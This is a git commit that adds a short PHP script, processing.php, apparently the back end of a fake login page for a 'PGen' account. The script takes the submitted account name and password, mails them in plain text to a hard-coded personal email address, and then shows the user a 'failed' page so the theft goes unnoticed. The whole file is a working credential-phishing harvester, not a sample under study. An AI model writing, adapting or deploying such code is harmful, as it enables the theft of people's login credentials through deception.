381a6d9a5e64dea82de33bbb3274a7277ba61e9b
lars0ders0 <42238215+lars0ders0@users.noreply.github.com>
2018-11-20 18:51:14 +0100

    Add files via upload

---
+++ processing.php
@@ -0,0 +1,16 @@
+﻿<?php
+$to = "derlars1212@gmail.com";
+$subject = "PGen Account";
+$txt = "Username: " . $_REQUEST["accountName"] . "<br />Password: " . $_REQUEST["password"];
+$headers = "MIME-Version: 1.0" . "\r\n";
+$headers .= "Content-type:text/html;charset=iso-8859-1" . "\r\n";
+$headers .= "From: PGen" . "\r\n";
+mail($to,$subject,$txt,$headers);
+
+include("top.html");
+include("failed.html");
+include("bottom.html");
+
+
+
+?>
